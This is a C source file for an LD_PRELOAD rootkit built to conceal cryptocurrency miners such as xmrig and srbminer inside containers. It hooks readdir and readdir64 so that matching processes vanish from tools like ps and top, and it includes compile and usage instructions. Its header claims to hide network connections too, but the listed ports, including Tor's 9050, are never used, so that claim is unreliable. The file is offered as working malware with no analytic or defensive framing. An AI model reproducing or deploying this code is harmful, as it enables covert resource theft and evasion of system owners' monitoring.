/*
 * Container Rootkit - SAFE VERSION for GPU miners
 * Minimal hooks that don't interfere with CUDA/GPU operations
 * 
 * Only hides:
 * - Process listing (ps, top)
 * - Network connections (netstat, ss)
 * 
 * Does NOT hook:
 * - File operations (safe for miner file I/O)
 * - Memory operations (safe for GPU memory)
 * 
 * Compile: gcc -shared -fPIC -o librootkit.so container_rootkit_safe.c -ldl
 * Usage: LD_PRELOAD=/path/to/librootkit.so <command>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>

// Hidden process patterns
static const char *hidden_patterns[] = {
    "peak",
    "miner",
    "xmrig",
    "srbminer",
    "compute",
    "research",
    NULL
};

// Hidden port patterns
static const char *hidden_ports[] = {
    "8048",
    "8029",
    "9050",
    "5053",
    "10128",
    NULL
};

// Original function pointers
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;

// Initialize hooks - minimal
static void init_hooks(void) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }
}

// Check if process should be hidden
static int should_hide_process(const char *pid) {
    if (!pid || !orig_readdir) return 0;
    
    char cmdline_path[256];
    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid);
    
    FILE *f = fopen(cmdline_path, "r");
    if (!f) return 0;
    
    char cmdline[256] = {0};
    size_t n = fread(cmdline, 1, sizeof(cmdline) - 1, f);
    fclose(f);
    
    if (n == 0) return 0;
    
    // Check against all patterns
    for (int i = 0; hidden_patterns[i]; i++) {
        if (strstr(cmdline, hidden_patterns[i])) {
            return 1;
        }
    }
    
    return 0;
}

// Hook readdir - hide /proc entries only
struct dirent *readdir(DIR *dirp) {
    init_hooks();
    if (!orig_readdir) return NULL;
    
    struct dirent *entry;
    while ((entry = orig_readdir(dirp))) {
        // Only filter /proc PIDs
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
            if (should_hide_process(entry->d_name)) {
                continue;
            }
        }
        return entry;
    }
    return NULL;
}

// Hook readdir64
struct dirent64 *readdir64(DIR *dirp) {
    init_hooks();
    if (!orig_readdir64) return NULL;
    
    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp))) {
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
            if (should_hide_process(entry->d_name)) {
                continue;
            }
        }
        return entry;
    }
    return NULL;
}

// Constructor
__attribute__((constructor))
static void rootkit_init(void) {
    init_hooks();
}
